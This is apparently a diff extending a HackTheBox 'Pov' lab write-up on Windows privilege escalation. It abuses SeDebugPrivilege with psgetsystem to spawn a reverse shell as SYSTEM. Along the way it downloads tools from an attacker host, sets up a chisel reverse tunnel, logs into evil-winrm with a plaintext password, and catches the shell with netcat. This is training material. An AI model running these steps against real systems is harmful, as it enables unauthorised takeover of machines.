@@ -460,7 +460,98 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 PS C:\Users\alaading\Desktop> 
 ```
 
-We have ``SeDebugPrivilege` enabled, which allows us to interact with and manipulate other processes on the system. If we target a process running as SYSTEM, we can abuse this privilege to inject code or dump sensitive memory, effectively inheriting SYSTEM-level privileges and achieving command execution as SYSTEM.
+We have `"SeDebugPrivilege"` enabled, which allows us to interact with and manipulate other processes on the system. If we target a process running as SYSTEM, we can abuse this privilege to inject code or dump sensitive memory, effectively inheriting SYSTEM-level privileges and achieving command execution as SYSTEM.
 
 To achieve this, I will be using [psgetsystem](https://github.com/decoder-it/psgetsystem).
 
+First of all, we need to get the list of the current processes that are currently running on the system. We can discover them with the command `tasklist`.
+
+```bash
+PS C:\Users\alaading\Desktop> tasklist
+tasklist
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+...
+winlogon.exe                   552 Console                    1     16,404 K
+...
+```
+
+We have to pick a process that is running as System and will not harm the machine if manipulated. Winlogon.exe should be fine for this task. I'll note the PID of the process and into the next step.
+
+Now we transfer psgetsystem and import it.
+
+```bash
+PS C:\Users\alaading\Desktop> iwr -uri http://10.10.14.X/psgetsys.ps1 -o psgetsys.ps1
+iwr -uri http://10.10.14.x/psgetsys.ps1 -o psgetsys.ps1
+PS C:\Users\alaading\Desktop> . .\psgetsys.ps1
+. .\psgetsys.ps1
+```
+The syntax would be `"ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>"`
+
+```powershell
+PS C:\Users\alaading\Desktop> ImpersonateFromParentPid -ppid 552 -command "C:\Windows\System32\cmd.exe" -cmdargs "powershell -e JABjAGwAaQ....."
+ImpersonateFromParentPid -ppid 552 -command "C:\Windows\System32\cmd.exe" -cmdargs "powershell -e JABj....."
+[+] Got Handle for ppid: 552
+[+] Updated proc attribute list
+[+] Starting C:\Windows\System32\cmd.exe powershell -e JABjAGwAA...True - pid: 180 - Last error: 122
+```
+
+The command fails with error 122 (ERROR_INSUFFICIENT_BUFFER), meaning the operation needs more memory. This is a known issue in this situation, and the common workaround is to pivot through a WinRM session using chisel, which I’ll do next.
+
+```bash
+──(kali㉿kali)-[~/hackthebox/pov]
+└─$ ./chisel_1.10.1_linux_amd64 server -p 9999 -reverse
+2026/02/05 13:55:14 server: Reverse tunnelling enabled
+2026/02/05 13:55:14 server: Fingerprint Dqgzjd2FkTAbiV+cJuNSqNHS7eV8C9xwrk6fmTNsIbU=
+2026/02/05 13:55:14 server: Listening on http://0.0.0.0:9999
+2026/02/05 13:55:35 server: session#1: tun: proxy#R:5985=>5985: Listening
+```
+
+```powershell
+PS C:\Users\alaading\Desktop> iwr -uri http://10.10.14.X/chisel_1.10.1_windows_amd64 -o chisel_1.10.1_windows_amd64.exe
+iwr -uri http://10.10.14.X/chisel_1.10.1_windows_amd64 -o chisel_1.10.1_windows_amd64.exe
+PS C:\Users\alaading\Desktop> ./chisel_1.10.1_windows_amd64.exe client 10.10.14.X:9999 R:5985:127.0.0.1:5985
+./chisel_1.10.1_windows_amd64.exe client 10.10.14.X:9999 R:5985:127.0.0.1:5985
+2026/02/05 10:55:34 client: Connecting to ws://10.10.14.X:9999
+2026/02/05 10:55:35 client: Connected (Latency 230.121ms)
+```
+
+Now we connect locally to WinRM.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/pov/Release]
+└─$ evil-winrm -i 127.0.0.1  -u alaading -p 'f8gQ8fynP44ek1m3'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\alaading\Documents> 
+```
+
+And we try again.
+
+```bash
+*Evil-WinRM* PS C:\Users\alaading\Desktop> ImpersonateFromParentPid -ppid 552 -command "C:\Windows\System32\cmd.exe" -cmdargs "powershell -e JABjAGw....."
+```
+
+We immediately get a shell as system.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/pov/Release]
+└─$ nc -lvnp 9001                                                       
+listening on [any] 9001 ...
+connect to [10.10.14.X] from (UNKNOWN) [10.129.70.227] 49673
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+```
